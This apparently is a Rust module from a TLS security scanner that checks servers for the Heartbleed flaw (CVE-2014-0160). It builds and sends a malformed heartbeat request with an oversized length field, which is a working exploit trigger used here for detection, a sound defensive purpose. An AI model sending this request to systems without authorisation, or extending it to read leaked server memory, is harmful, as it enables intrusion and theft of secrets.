//! Heartbleed vulnerability check (CVE-2014-0160)
//!
//! Heartbleed is a vulnerability in OpenSSL's implementation of the TLS/DTLS
//! heartbeat extension. An attacker can read memory from the server.

use anyhow::Result;
use tracing::{debug, info};

use crate::tls::client_hello::{ClientHelloBuilder, TlsVersion};
use crate::tls::socket::TlsSocket;
use crate::ScanTarget;

use super::VulnResult;

/// Build the malicious heartbeat request
/// This is a heartbeat request with the length field set much larger than the payload
fn build_heartbeat_request() -> Vec<u8> {
    // TLS heartbeat request record
    // Content type: 24 (heartbeat)
    // Version: TLS 1.0 (0x0301)
    // Length: 4 bytes (1 type + 2 payload_length + 1 padding)
    // Heartbeat type: 1 (request)
    // Payload length: 0x4000 (16384 - much larger than actual payload)
    // Payload: empty (0 bytes)

    let payload_length: u16 = 0x4000; // Malicious large length

    let heartbeat = vec![
        0x01u8, // heartbeat_request
        (payload_length >> 8) as u8,
        (payload_length & 0xff) as u8,
    ];
    // No actual payload - this is what triggers heartbleed

    let record_len = heartbeat.len() as u16;

    let mut record = vec![
        0x18u8, // Content type: heartbeat
        0x03,   // TLS version major
        0x02,   // TLS version minor (TLS 1.1, to match common heartbleed tests)
        (record_len >> 8) as u8,
        (record_len & 0xff) as u8,
    ];
    record.extend_from_slice(&heartbeat);

    record
}

/// Build the heartbeat-enabled ClientHello
fn build_heartbleed_client_hello(version: TlsVersion, sni: Option<&str>) -> Vec<u8> {
    let mut builder = ClientHelloBuilder::new(version).with_heartbeat();
    if let Some(s) = sni {
        builder = builder.with_sni(s);
    }
    builder.build()
}

/// Check for Heartbleed vulnerability
/// Returns VulnResult indicating if server is vulnerable
pub async fn check_heartbleed(target: &ScanTarget) -> Result<VulnResult> {
    info!(
        "Checking for Heartbleed (CVE-2014-0160) on {}:{}",
        target.host, target.port
    );

    let cve = vec!["CVE-2014-0160".to_string()];

    // We test multiple TLS versions as Heartbleed affected many
    for version in &[TlsVersion::Tls11, TlsVersion::Tls12, TlsVersion::Tls10] {
        match test_heartbleed_version(target, *version).await {
            Ok(true) => {
                return Ok(VulnResult::vulnerable(
                    "Heartbleed",
                    cve,
                    format!("Server is VULNERABLE to Heartbleed with {:?}", version),
                ));
            }
            Ok(false) => {
                debug!("Not vulnerable with {:?}", version);
            }
            Err(e) => {
                debug!("Error testing {:?}: {}", version, e);
            }
        }
    }

    Ok(VulnResult::not_vulnerable("Heartbleed"))
}

async fn test_heartbleed_version(target: &ScanTarget, version: TlsVersion) -> Result<bool> {
    let host = target
        .ip
        .map(|ip| ip.to_string())
        .unwrap_or_else(|| target.host.clone());

    let mut socket = TlsSocket::connect(&host, target.port, target.timeout_secs).await?;

    if let Some(ref starttls) = target.starttls {
        if starttls.negotiate(&mut socket).await.is_err() {
            return Ok(false);
        }
    }

    // Send ClientHello with heartbeat extension
    let hello = build_heartbleed_client_hello(version, target.sni.as_deref());
    socket.send(&hello).await?;

    // Read ServerHello
    let response = match socket.recv_multiple_records(5000).await {
        Ok(data) if !data.is_empty() => data,
        _ => return Ok(false),
    };

    // Check if we got a ServerHello (connection was established)
    let sh_result = crate::tls::server_hello::ServerHelloParser::parse(&response)?;
    if !crate::tls::server_hello::ServerHelloParser::is_successful(&sh_result) {
        return Ok(false);
    }

    // Check if heartbeat was offered in ServerHello
    if !sh_result.heartbeat_offered {
        debug!("Server did not offer heartbeat extension");
        return Ok(false);
    }

    // Wait for ServerHelloDone then send heartbeat
    // In a full implementation, we'd complete the partial handshake
    // then send the malicious heartbeat
    // For now, send the malicious heartbeat request
    let heartbeat = build_heartbeat_request();
    if socket.send(&heartbeat).await.is_err() {
        return Ok(false);
    }

    // Read response with a longer timeout
    // A vulnerable server will respond with a heartbeat response containing memory
    let response2 =
        match tokio::time::timeout(tokio::time::Duration::from_secs(8), socket.recv(65535)).await {
            Ok(Ok(data)) if !data.is_empty() => data,
            _ => return Ok(false),
        };

    // Check if we got a heartbeat response (content type 24)
    let is_vulnerable = response2.windows(3).any(|w| {
        w[0] == 0x18 // heartbeat content type
            && (w[1] == 0x03) // TLS version
            && w[2] <= 0x03
    }) && response2.len() > 10;

    if is_vulnerable {
        debug!("Got heartbeat response - server may be vulnerable!");
    }

    Ok(is_vulnerable)
}
